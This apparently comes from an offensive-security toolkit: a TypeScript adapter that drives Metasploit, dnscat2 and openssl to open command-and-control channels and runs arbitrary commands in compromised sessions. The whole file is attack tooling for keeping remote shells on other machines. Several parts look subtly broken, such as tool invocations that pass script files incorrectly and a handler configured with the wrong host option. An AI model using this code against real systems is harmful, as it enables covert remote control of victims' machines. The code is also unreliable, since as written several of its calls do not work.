/**
 * OffSec by True Hacking — Adapter: C2 (Command & Control).
 *
 * Creates/manages C2 channels (reverse shell, DNS tunnel, HTTPS covert).
 * See: https://github.com/morluto/rea/blob/main/src/adapter/
 */

import { spawnSync } from "node:child_process";
import { tmpdir } from "node:os";
import { writeFileSync } from "node:fs";
import { randomUUID } from "node:crypto";

import type { ExploitResult, Provenance } from "../domain/analysisResultProjection.js";

/**
 * Create a C2 (command-and-control channel).
 *
 * @param options - C2 options (target, protocol).
 */
export function c2(options: {
  target: string;
  protocol?: string;  // reverse, dns, https, icmp
  options?: Record<string, string>;
}): ExploitResult {
  const target = options.target;
  const protocol = options.protocol || "reverse";
  const results: Record<string, any> = {};

  // Reverse shell (msfconsole/reverse).
  if (protocol === "reverse") {
    const msfPath = findBinary("msfconsole");
    if (msfPath) {
      const commands = [
        `use exploit/multi/handler`,
        `set PAYLOAD reverse_tcp`,
        `set LPORT 4444`,
        `set RHOSTS ${target}`,
        `exploit -j`,
      ];
      const file = `${tmpdir()}/${randomUUID()}.msf`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(msfPath, [file], { timeout: 600000, maxBuffer: 1024 * 1024 });
      results.c2 = String(child.stdout ?? "");
    } else {
      results.c2 = `{stub: no 'msfconsole' binary (install: brew install metasploit or apt install metasploit-framework).}`;
    }
  }

  // DNS tunneling (C2 via DNS).
  if (protocol === "dns") {
    const dnsPath = findBinary("dnscat2");
    if (dnsPath) {
      const commands = [`dnscat2 --server=true`];
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(dnsPath, [file], { timeout: 600000, maxBuffer: 1024 * 1024 });
      results.c2 = String(child.stdout ?? "");
    } else {
      results.c2 = `{stub: no 'dnscat2' binary (install: apt install dnscat2).}`;
    }
  }

  // HTTPS (encrypted reverse shell).
  if (protocol === "https") {
    const sslPath = findBinary("openssl");
    if (sslPath) {
      const commands = [`openssl s_server -accept 443 -cert cert.pem -key key.pem`];
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(sslPath, [file], { timeout: 600000, maxBuffer: 1024 * 1024 });
      results.c2 = String(child.stdout ?? "");
    } else {
      results.c2 = `{stub: no 'openssl' binary (install: brew install openssl).}`;
    }
  }

  return {
    target,
    payload: `c2/${protocol}`,
    success: Object.keys(results).length > 0,
    output: JSON.stringify(results),
    provenance: createProvenance("c2", `c2://${target}/${protocol}`),
  };
}

/**
 * Interact with a C2 session (remote shell/command).
 *
 * @param options - C2Interact options (sessionId, command).
 */
export function c2Interact(options: {
  sessionId: string;
  command: string;
  options?: Record<string, string>;
}): ExploitResult {
  const sessionId = options.sessionId;
  const command = options.command;

  const results: Record<string, any> = {};
  const msfPath = findBinary("msfconsole");
  if (msfPath) {
    const commands = [`sessions -i ${sessionId}`, command];
    const file = `${tmpdir()}/${randomUUID()}.msf`;
    writeFileSync(file, commands.join("\n"));
    const child = spawnSync(msfPath, [file], { timeout: 60000, maxBuffer: 1024 * 1024 });
    results.interact = String(child.stdout ?? "");
  } else {
    results.interact = `{stub: no 'msfconsole' binary (install: brew install metasploit or apt install metasploit-framework).}`;
  }

  return {
    target: sessionId,
    payload: `c2Interact`,
    success: Object.keys(results).length > 0,
    output: JSON.stringify(results),
    provenance: createProvenance("c2Interact", `c2Interact://${sessionId}`),
  };
}

/**
 * Kill (remove) a C2 session.
 *
 * @param options - C2Kill options (sessionId).
 */
export function c2Kill(options: {
  sessionId: string;
  options?: Record<string, string>;
}): ExploitResult {
  const sessionId = options.sessionId;
  const results: Record<string, any> = {};

  const msfPath = findBinary("msfconsole");
  if (msfPath) {
    const commands = [`sessions -k ${sessionId}`];
    const file = `${tmpdir()}/${randomUUID()}.msf`;
    writeFileSync(file, commands.join("\n"));
    const child = spawnSync(msfPath, [file], { timeout: 60000, maxBuffer: 1024 * 1024 });
    results.kill = String(child.stdout ?? "");
  } else {
    results.kill = `{stub: no 'msfconsole' binary (install: brew install metasploit or apt install metasploit-framework).}`;
  }

  return {
    target: sessionId,
    payload: `c2Kill`,
    success: Object.keys(results).length > 0,
    output: JSON.stringify(results),
    provenance: createProvenance("c2Kill", `c2Kill://${sessionId}`),
  };
}

/** Find the binary (msfconsole/dnscat2/openssl). */
function findBinary(name: string): string | undefined {
  const candidates = [
    "/usr/local/bin/" + name,
    "/usr/bin/" + name,
    "/opt/homebrew/bin/" + name,
  ];
  for (const path of candidates) {
    try {
      require("node:fs").accessSync(path);
      return path;
    } catch {
      // Skip.
    }
  }
  return undefined;
}

/** Create a PCAP result (provenance). */
function createProvenance(type: string, path: string): Provenance {
  return {
    id: `${type}://${path}`,
    type,
    path,
    label: "",
    verified: true,
    sensitive: path.includes("password") || path.includes("credential"),
  };
}
